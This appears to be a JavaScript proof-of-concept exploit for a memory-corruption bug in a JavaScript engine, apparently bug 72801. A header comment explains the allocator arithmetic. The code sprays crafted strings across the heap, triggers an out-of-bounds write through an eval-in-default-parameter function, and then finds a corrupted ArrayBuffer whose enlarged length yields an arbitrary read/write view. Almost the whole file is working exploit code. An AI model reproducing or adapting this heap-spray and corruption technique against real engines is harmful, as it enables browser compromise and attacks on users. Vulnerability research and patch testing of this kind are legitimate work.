"use strict";
/* Route-2 string-slab variant for 72801.
 *
 * b is made class 512 (9 distinct float constants in the body -> cpool
 * 9*16 = 144 bytes, BSIZE 504).  With b in a class-512 block the OOB target
 * is at user offset (108 + 16*cpool) mod 512 = 252 of block k, INDEPENDENT
 * of b's block index k (verified: target = b + 1,310,972, page offset
 * 308 + 512k).  The spray is 479-char strings: each string is a single
 * class-512 arena block, so a slab filled with strings has 16/16 class-512
 * pages (no foreign class-ie slot can be hit).  The record pair is placed at
 * data offset 228 (= (252-24) mod 512) and 248, which is where the target
 * lands for every k.
 */
var NP = 4000, NQ = 2600, L = 479;
var GG = new Array(1500);
for (var i = 0; i < 1500; i++) GG[i] = "x".repeat(2048);
var G0 = {};
GG = null; G0 = null;

var RT = [4,0,0,128,5,0,0,0,4,0,0,0,4,0,0,0,4,0,0,0];
var RJ = [4,0,0,128,5,0,0,0,255,255,0,0,4,0,0,0,4,0,0,0];
var U = new Uint8Array(L);
for (var o = 28; o + 40 <= L; o += 40) {
  for (var k = 0; k < 20; k++) { U[o+k] = RJ[k]; U[o+20+k] = RT[k]; }
}
var A = new Array(NP + NQ);
for (var i = 0; i < NP; i++) A[i] = String.fromCharCode.apply(null, U);
var X = String.fromCharCode.apply(null, U); X = null;
var S = '"use strict"; globalThis.f = function ([] = eval("[]")) { var q1=0,q2=0,q3=0; return 1.1+2.2+3.3+4.4+5.5+6.6+7.7+8.8+9.9; };';
(0, eval)(S);
for (var i = NP; i < NP + NQ; i++) A[i] = String.fromCharCode.apply(null, U);
var D = new Array(600);
for (var i = 0; i < 600; i++) D[i] = new ArrayBuffer(64);
var T = new Array(600);
for (var i = 0; i < 600; i++) T[i] = new ArrayBuffer(64);
T[598] = null;
var mark = "NOCORR";
try { f(); } catch (e) {}
for (var i = 0; i < 600; i++) {
  if (T[i] !== null && T[i].byteLength > 1024) {
    mark = "ABLEN[" + i + "]=" + T[i].byteLength;
    break;
  }
}
var V = null, VAB = null;
for (var i = 0; i < 600; i++) { if (T[i] !== null && T[i].byteLength > 1024) { VAB = T[i]; break; } }
if (VAB) { try { V = new Uint8Array(VAB); mark += " VLEN=" + V.length; } catch (e2) { mark += " VERR=" + e2; } }
globalThis.V = V; globalThis.VAB = VAB; globalThis.T = T;
throw new Error("RESULT " + mark);
